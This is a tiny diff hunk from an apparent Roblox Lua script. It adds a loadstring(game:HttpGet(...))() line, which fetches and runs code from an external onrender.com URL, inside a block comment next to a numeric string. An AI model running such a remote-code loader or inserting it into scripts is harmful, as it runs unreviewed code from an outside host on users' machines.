@@ -112,4 +112,5 @@ end)
 
 --[[
 9179275187018728
+loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/a4d65b110cf1375a8f54ffc833caa6fd"))()
 ]]
